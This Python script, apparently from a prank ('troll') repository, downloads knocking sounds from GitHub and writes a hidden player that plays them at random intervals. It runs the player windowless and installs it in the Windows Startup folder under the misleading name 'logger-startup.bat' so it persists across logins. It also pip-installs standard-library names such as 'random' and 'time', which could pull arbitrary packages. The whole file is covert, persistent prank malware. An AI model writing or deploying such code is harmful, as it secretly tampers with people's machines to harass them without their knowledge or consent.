import os

os.system("pip install random")
os.system("pip install time")
os.system("pip install winsound")
os.system("pip install pythonw")
os.system("pip install requests")

import requests

sound_urls = ["https://github.com/TheBigCarrot/PyTrolls/raw/main/knock1.wav", "https://github.com/TheBigCarrot/PyTrolls/raw/main/knock2.wav"]

parent_directory = r"C:\Users\Public\Documents"
mp3_dir = "mp3s"

mp3_dir = os.path.join(parent_directory, mp3_dir)

#Make the directory if it doesnt exist
if not os.path.exists(mp3_dir):
    os.makedirs(mp3_dir)
else:
    print("Directory already exists!")

#Download all sounds
for url in sound_urls:
    response = requests.get(url)
    if response.status_code == 200:
        with open(os.path.join(mp3_dir, os.path.basename(url)), "wb") as f:
            f.write(response.content)
        print(f"File saved!")
    else:
        print("Error downloading file")


#Create python script
dir_path = r'C:\Users\Public\Documents\mp3s'
file_path = os.path.join(dir_path, "sound-player.py")

file_contents = 'import winsound\nimport os\nimport random\nimport time\nwhile True:\n\ttime.sleep(random.randint(60,900))\n\tmp3_files=[f for f in os.listdir(r"C:\\Users\\Public\\Documents\\mp3s")if f.endswith(".wav")]\n\tmp3_file=random.choice(mp3_files)\n\twinsound.PlaySound(os.path.join(r"C:\\Users\\Public\\Documents\\mp3s",mp3_file),winsound.SND_FILENAME)'

with open(file_path, "w") as f:
    f.write(file_contents)
    f.close()

os.system(r'start /B pythonw "C:\Users\Public\Documents\mp3s\sound-player.py"')

#Create startup batch file
dir_path = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(os.environ.get('USERNAME'))
file_path = os.path.join(dir_path, "logger-startup.bat")

file_contents = '@echo off\nstart /B pythonw "C:\\Users\\Public\\Documents\\mp3s\\sound-player.py"'

with open(file_path, "w") as f:
    f.write(file_contents)
    f.close()